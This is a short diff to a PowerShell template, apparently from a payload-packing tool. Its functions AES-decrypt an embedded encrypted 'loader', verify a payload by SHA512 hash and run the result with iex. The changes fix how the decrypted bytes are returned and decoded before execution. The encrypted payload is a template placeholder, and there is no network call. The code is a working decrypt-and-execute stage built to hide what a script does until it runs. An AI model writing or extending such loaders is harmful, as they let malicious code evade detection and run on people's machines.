@@ -39,12 +39,15 @@ function Get-DecryptedString($key, $encryptedStringWithIV) {{
     $decryptor = $aesManaged.CreateDecryptor();
     $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
     $aesManaged.Dispose()
-    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
+    #[System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
+    return $unencryptedData
 }}
 
 function Get-CheckHash($payload, $payload_hash, $minus_bytes) {{
     $sha512 = new-Object System.Security.Cryptography.SHA512Managed
-    if ([System.BitConverter]::ToString($sha512.ComputeHash([system.Text.Encoding]::UTF8.GetBytes($payload.Substring(0,$payload.Length-$minus_bytes)))).ToLower().Replace("-", "").Equals($payload_hash)) {{
+    $end = $payload.Length - $minus_bytes -1
+        
+    if ([System.BitConverter]::ToString($sha512.ComputeHash($payload[0..$end])).ToLower().Replace("-", "").Equals($payload_hash)) {{
         return 1
     }} Else {{
         return 0
@@ -54,7 +57,8 @@ function Get-CheckHash($payload, $payload_hash, $minus_bytes) {{
 function Get-CodeExecution($key, $payload){{
 	$encryptedString = "{3}"
 	$decrypted_loader = Get-DecryptedString $key $encryptedString
-	iex $decrypted_loader
+    $decoded_loader = [System.Text.Encoding]::ASCII.GetString($decrypted_loader).Trim([char]0)
+    iex $decoded_loader
 }}
 
 function Get-R-Done($some_dir, $encrypted_msg, $payload_hash, $minus_bytes, $location, $key_len, $key_iterations){{
